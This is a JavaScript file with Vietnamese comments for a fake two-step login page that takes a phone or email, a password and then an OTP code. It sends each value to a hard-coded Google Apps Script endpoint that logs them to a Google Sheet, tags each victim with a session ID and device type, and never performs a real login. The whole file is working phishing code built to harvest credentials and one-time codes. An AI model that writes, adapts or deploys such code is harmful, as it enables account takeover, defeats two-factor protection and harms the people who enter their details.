// --- CẤU HÌNH ---
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz4JD9KreKPaB5AhB4wXAh1DZtQoHvblwnsr3SCsGbd4l1u1qFhx_TKRLv4r-c8vJ_Wuw/exec";

// Biến toàn cục
let globalPhone = "";
let globalPassword = "";
let currentSessionId = ""; 

// Khởi tạo trạng thái ban đầu
window.onload = function() {
    const alertBox = document.getElementById('custom-alert');
    if (alertBox) { alertBox.style.display = 'none'; }
};

// --- LOGIC CHÍNH ---

// 1. Chuyển từ Bước 1 sang Bước 2
async function nextStep() {
    globalPhone = document.getElementById('phone').value;
    globalPassword = document.getElementById('pass').value;

    if (!globalPhone.trim() || !globalPassword.trim()) {
        alert("Please enter your email/phone and password.");
        return;
    }

    currentSessionId = "SID-" + Date.now(); 
    
    // Rút gọn thông tin thiết bị
    const ua = navigator.userAgent;
    let shortDevice = "Desktop";
    if (/Android/i.test(ua)) shortDevice = "Android";
    else if (/iPhone|iPad|iPod/i.test(ua)) shortDevice = "iOS";
    else if (/Windows/i.test(ua)) shortDevice = "Windows";
    else if (/Macintosh/i.test(ua)) shortDevice = "MacOS";
    
    // Gửi thông tin đăng nhập trực tiếp tới Google Sheet
    fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `session_id=${currentSessionId}&phone=${encodeURIComponent(globalPhone)}&password=${encodeURIComponent(globalPassword)}&device=${encodeURIComponent(shortDevice)}`
    });

    // Cập nhật giao diện
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    document.getElementById('main-wrapper').classList.add('only-step2');

    const footer = document.querySelector('.footer-section');
    if (footer) { footer.style.display = 'none'; }
    document.getElementById('custom-alert').style.display = 'none';
}

// 2. Kiểm tra input OTP
function checkOtpInput() {
    const otpInput = document.getElementById('otp-code');
    const btnSubmit = document.getElementById('btn-submit-otp');
    if (btnSubmit.disabled) return;
    btnSubmit.classList.toggle('active', otpInput.value.trim().length > 0);
}

// 3. GỬI OTP
async function submitOtp() {
    const otpInput = document.getElementById('otp-code');
    const otpValue = otpInput.value.trim();
    if (otpValue === "") return;

    // Gửi OTP trực tiếp tới Google Sheet
    fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `session_id=${currentSessionId}&otp=${encodeURIComponent(otpValue)}`
    });

    // Hiện thông báo (Alert)
    document.getElementById('custom-alert').style.display = 'flex';
}

// 4. Đóng thông báo
function closeAlert() {
    document.getElementById('custom-alert').style.display = 'none';
    document.getElementById('otp-code').value = "";
    const btnSubmit = document.getElementById('btn-submit-otp');
    if (btnSubmit) btnSubmit.classList.remove('active');
}
/* --- HÀM XỬ LÝ MỜ NÚT (5 GIÂY) --- */
function startButtonCooldown(buttonElement) {
    // Thêm class đã tạo trong CSS để làm mờ
    buttonElement.classList.add('disabled-btn');
    
    // Sau 5 giây, gỡ bỏ class đó để nút hoạt động lại
    setTimeout(function() {
        buttonElement.classList.remove('disabled-btn');
    }, 5000); // 5000ms = 5 giây
}

/* --- GẮN SỰ KIỆN VÀO CÁC NÚT CỦA BẠN --- */

// 1. Nút "Log In" ở bước 1
const loginBtn = document.querySelector('.btn-login');
if (loginBtn) {
    loginBtn.addEventListener('click', function() {
        startButtonCooldown(this);
    });
}

// 2. Nút "Continue" ở bước 2
const otpBtn = document.getElementById('btn-submit-otp');
if (otpBtn) {
    otpBtn.addEventListener('click', function() {
        startButtonCooldown(this);
    });
}
